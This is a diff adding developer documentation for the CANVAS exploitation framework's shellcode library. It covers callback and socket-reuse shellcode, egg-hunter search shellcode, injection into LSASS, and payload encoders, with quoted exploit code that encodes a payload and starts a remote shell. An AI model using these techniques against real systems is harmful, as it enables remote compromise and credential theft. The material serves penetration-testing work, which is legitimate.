@@ -1,0 +1,121 @@
+CANVAS Shellcode Document
+
+CANVAS supports many platforms and for each platform has multiple shellcodes.
+These shellcode generally fall into several catagegories as to their function
+and size. Additionally CANVAS supports several types of encoder/decoders.
+While the library is richest for x86, it is often quite capable for PPC/SPARC
+and other platforms.
+
+The most popular shellcode is the simple callback shellcode. These are created like so:
+
+    createWin32ThreadCallbackShellcode() #defined in canvasexploit.py
+    
+    #tcpexploit.py
+    createWin32Shellcode(self.badstring,localhost,localport)
+
+Of course, there are versions of the callback for each platform we support.
+
+tcpexploit::createSparcShellcode(self, badstring, localhost,localport,rawshellcode="")
+
+
+The other major shellcode type is the "stealing the socket" type. 
+
+tcpexploit::createWin32Peek(self,ordinal=1,echomarker=1,subesp=0)
+tcpexploit::createLinuxGOcodeWithShell(self,badstring)
+tcpexploit::createLinuxFindSckCode(self,s)
+tcpexploit::createLinuxGOShellcode(self,badstring, oldcode = 0)
+
+For windows we tend to use the shellcode generator to create GO code. This example comes from
+niprint.py.
+
+def createShellcode(self):
+        sc = shellcodeGenerator.win32()
+        sc.addAttr("GOFindSock", { "setblocking" : 1 })
+        sc.addAttr("RecvExecWin32", None)
+        self.shellcode = sc.get()
+        encoder = chunkedaddencoder.intelchunkedaddencoder()
+        encoder.setbadstring(self.badstring)
+        self.log("Encoding shellcode")
+        self.shellcode = encoder.encode(self.shellcode)
+        if self.shellcode == "":
+            self.log("Problem encoding shellcode")
+            return 0
+        return self.shellcode
+
+With shellcodes that require a handshake, you need to have that code in your exploit as well. Again
+from niprint.py:
+
+    if self.checkTriggerWin32(s):
+            self.setInfo("%s attacking %s:%d - done (success!)"% (NAME, self.host, self.port))
+            return self.doStageTwo(s)
+            ...
+    def doStageTwo(self, s):
+        self.log("Got trigger!")
+        node=win32Node()
+        node.parentnode=self.argsDict["passednodes"][0]
+        newshell = win32MosdefShellServer.win32shellserver(s,node,self.logfunction)
+        node.startup()
+        self.setInfo("%s attacking %s:%d - (succeeded!)" % (NAME, self.host, self.port), showlog=1) 
+        self.log("Thanks \\0/")
+        return node
+
+Of course, there's also this API to shorten that process:
+tcpexploit::doGOMOSDEFWin32(self, s,currentNode=None)
+
+
+Search Shellcodes
+
+Search shellcodes are shellcodes that are small and used only to find other, larger shellcodes.
+tcpexploit::createWin32SearchShellcode(self,localhost,localport,rawshellcode=None)
+
+Note that this API does not have a badstring argument.
+
+This creates two shellcodes, with two different badchar lists. The
+encodedsearchcode hooks the exception handler functionality of Win32 (or uses
+special syscalls in case of Unix) and looks for a special 64 bit tag that
+preceeds the self.shellcode. This tag is automatically added by
+createWin32SearchShellcode. You should be careful regarding heap corruption
+when using SearchShellcodes. It is often wise to use a heap-escape shellcode
+as your final payload.
+
+In Windows, the search shellcode itself is around 130 bytes and should be
+portable to any Win32 environment. One typical usage is to create two
+connections to a target application. In the first connection, you send your
+heap escape shellcode, and in the second, you attack with your overflow and
+the search shellcode. 
+
+Currently we only have a search shellcode done for Win32, although Unix search
+shellcodes are quite easy to whip up. See the awservices exploit for an
+example of using the searchcode.
+
+
+
+Injection shellcodes are used for heap overflows or client side exploits that need to escape
+the current process. These are both for windows:
+def createHeapSafeInject(self, badstring, localhost, localport, injectme="",setdebugprivs=0):
+def createHeapSafeInjectIntoProcess(self, badstring, localhost, localport, injectme="", smallcode=0, processname="LSASS.EXE", backupprocess="lsass.exe", append=None)
+    
+ 
+Encoders include the following, from small to large:
+   xorencoder 
+   addencoder 
+   chunkedaddencoder
+   printable encoder
+   
+These are used by the API's implicitly when you call them, but you can also call them manually by
+importing them from their modules in encoder/.
+   
+Also included is a special purpose encoder for joining two shellcodes together.
+canvasexploit::easychunk(self,chunkloc,chunksize,subesp)
+
+This is only available for x86 currently.
+
+
+Some shellcodes come in "small" or "known" versions. "Known" is the smallest we have, but it's 
+dependant on knowing the remote service pack and language. "Small" uses ordinal techniques to 
+squeeze the shellcode down at the expense of some ability to do error checking or a clean exit.
+Small shellcode can not be used for MSRPC exploits as they require a loadlibrary and reverttoself
+call. As "ordinal" is a shellcode attribute, it can be applied to any win32 shellcode.
+
+createSmallWin32GOShellcode(self,startsock=0x100,subesp=0)
+createKnownWin32Shellcode(self,known,host,port,subesp=0)
